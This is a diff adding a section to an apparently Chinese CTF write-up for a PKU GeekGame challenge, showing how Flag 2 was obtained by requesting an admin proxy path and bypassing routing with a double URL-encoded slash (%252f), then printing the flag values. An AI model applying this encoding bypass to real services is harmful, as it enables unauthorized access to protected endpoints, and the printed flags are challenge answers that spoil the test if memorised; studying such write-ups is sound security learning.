@@ -64,3 +64,23 @@ public class AdminController {
 ```json
 {"type":"PKU_GeekGame","value":"flag1{8a97cd0b-adec-4e63-bd46-3e6c60ea9d78} 恭喜你发现flag1，还有其他flag等待你发现哦"}
 ```
+
+## Flag 2
+
+`POST /admin/localhost:8080/` 得到提示：
+
+```txt
+Endpoints:/bonus/source_bak
+```
+
+尝试 `POST /admin/localhost:8080/bonus/source_bak`，果断 `404` 了。
+
+改为 `POST /admin/localhost:8080%2fbonus%2fsource_bak`，这回变成了 `400`。
+
+改为 `POST /admin/localhost:8080%252fbonus`，成功拿到了 Flag 2：
+
+```json
+{"type":"Bonus","value":"flag2{f2d9cc00-180b-404d-8117-d2e712c2e57b} 恭喜你发现flag2，还有其他flag等待你发现哦"}
+```
+
+## Flag 3
